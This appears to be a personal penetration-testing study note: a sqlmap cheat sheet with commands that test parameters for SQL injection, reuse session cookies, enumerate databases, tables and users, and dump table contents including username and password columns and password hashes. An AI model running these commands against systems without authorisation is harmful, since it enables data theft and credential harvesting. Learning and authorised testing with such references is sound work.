#sqlmap #cheatsheet #sql-injection #web-security

# SQLMap Cheat Sheet

## Basic Usage

```bash
sqlmap -u "http://target.com/page.php?id=1"
```

Test a URL parameter for SQL injection.

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

Enumerate available databases.

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
```

Enumerate tables inside a specific database.

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --columns
```

Enumerate columns inside a table.

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
```

Dump the contents of a specific table.

## Request Data

### POST Parameters

```bash
sqlmap -u "http://target.com/login" --data="username=test&password=test"
```

Test parameters submitted through POST data.

### Specific Parameter

```bash
sqlmap -u "http://target.com/page?id=1&user=admin" -p id
```

Test only the specified parameter.

### HTTP Request File

```bash
sqlmap -r request.txt
```

Use a previously captured HTTP request as the input.

This is particularly useful when testing complex requests or authenticated applications.

## Authentication

### Cookies

```bash
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=SESSION_VALUE"
```

Provide an existing session cookie.

This allows SQLMap to test endpoints that require authentication.

### User-Agent

```bash
sqlmap -u "http://target.com/page?id=1" --user-agent="Mozilla/5.0"
```

Specify a custom HTTP User-Agent.

### Headers

```bash
sqlmap -u "http://target.com/page?id=1" --headers="X-Custom-Header: value"
```

Add custom HTTP headers to requests.

## Detection

### Database Identification

```bash
sqlmap -u "http://target.com/page?id=1" --banner
```

Retrieve the database management system banner when possible.

```bash
sqlmap -u "http://target.com/page?id=1" --current-db
```

Identify the current database.

```bash
sqlmap -u "http://target.com/page?id=1" --current-user
```

Identify the database user executing the queries.

```bash
sqlmap -u "http://target.com/page?id=1" --is-dba
```

Check whether the current database user has DBA-level privileges.

## Enumeration

```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

List databases.

```bash
sqlmap -u "http://target.com/page?id=1" -D database --tables
```

List tables.

```bash
sqlmap -u "http://target.com/page?id=1" -D database -T table --columns
```

List columns.

```bash
sqlmap -u "http://target.com/page?id=1" -D database -T table --dump
```

Dump table contents.

```bash
sqlmap -u "http://target.com/page?id=1" -D database -T table -C username,password --dump
```

Dump only selected columns.

## Information Gathering

```bash
sqlmap -u "http://target.com/page?id=1" --hostname
```

Retrieve the database server hostname when supported.

```bash
sqlmap -u "http://target.com/page?id=1" --users
```

Enumerate database users when supported.

```bash
sqlmap -u "http://target.com/page?id=1" --passwords
```

Attempt to enumerate database password hashes when supported and permitted.

## Technique Selection

```bash
sqlmap -u "http://target.com/page?id=1" --technique=B
```

Use Boolean-based blind SQL injection.

```bash
sqlmap -u "http://target.com/page?id=1" --technique=E
```

Use error-based SQL injection.

```bash
sqlmap -u "http://target.com/page?id=1" --technique=U
```

Use UNION-based SQL injection.

```bash
sqlmap -u "http://target.com/page?id=1" --technique=T
```

Use time-based blind SQL injection.

Multiple techniques can be combined:

```bash
--technique=BEUT
```

## Database Management System

```bash
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

Specify the expected DBMS.

Common values include:

```text
mysql
postgresql
mssql
oracle
sqlite
```

Only specify the DBMS when there is a reason to constrain detection.

## Risk and Level

```bash
sqlmap -u "http://target.com/page?id=1" --level=3
```

Increase the number of tests SQLMap performs.

```bash
sqlmap -u "http://target.com/page?id=1" --risk=2
```

Increase the risk level of tests.

The defaults should generally be preferred initially. Increasing `--level` and `--risk` can substantially increase the number and aggressiveness of requests.

## Useful Options

```bash
--batch
```

Automatically choose default answers to prompts.

```bash
--flush-session
```

Clear the stored session for the target and start testing again.

```bash
--forms
```

Attempt to identify and test HTML forms.

```bash
--crawl=2
```

Crawl the target to a specified depth to discover URLs.

```bash
--threads=4
```

Use multiple concurrent threads where supported.

```bash
-v 3
```

Increase output verbosity.

## Typical Enumeration Workflow

```text
1. Identify a potentially injectable parameter
        ↓
2. Test the parameter
        ↓
3. Identify the DBMS
        ↓
4. Enumerate databases
        ↓
5. Enumerate tables
        ↓
6. Enumerate columns
        ↓
7. Dump relevant data
```

Typical progression:

```bash
sqlmap -u "URL"
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D database --tables
sqlmap -u "URL" -D database -T table --columns
sqlmap -u "URL" -D database -T table --dump
```

## Working with Burp Suite

A request captured with [[Burp Suite]] can be saved to a file and supplied directly to SQLMap:

```bash
sqlmap -r request.txt
```

This is useful when the request contains authentication cookies, POST parameters, custom headers, CSRF tokens, or other details that are difficult to reproduce manually.

## Important Concepts

```text
-u          Target URL
-r          HTTP request file
-p          Parameter to test
--data      POST data
--cookie    HTTP cookies
--headers   Custom HTTP headers
--dbs       Enumerate databases
--tables    Enumerate tables
--columns   Enumerate columns
--dump      Extract table data
-D          Select database
-T          Select table
-C          Select columns
--current-db
--current-user
--is-dba
--technique
--dbms
--level
--risk
--batch
-v          Verbosity
```

## Quick Reference

```bash
# Test URL
sqlmap -u "URL"

# Test specific parameter
sqlmap -u "URL" -p parameter

# POST request
sqlmap -u "URL" --data="param=value"

# Request file
sqlmap -r request.txt

# Databases
sqlmap -u "URL" --dbs

# Tables
sqlmap -u "URL" -D DB --tables

# Columns
sqlmap -u "URL" -D DB -T TABLE --columns

# Dump
sqlmap -u "URL" -D DB -T TABLE --dump

# Specific columns
sqlmap -u "URL" -D DB -T TABLE -C column1,column2 --dump

# Authenticated request
sqlmap -u "URL" --cookie="SESSION=value"

# Specific technique
sqlmap -u "URL" --technique=BEUT
```

## Related Notes

* [[SQLMap]]
* [[SQL]]
* [[SQL Injection]]
* [[Burp Suite]]
* [[HTTP]]
* [[Gobuster]]
* [[Offensive-Security]]
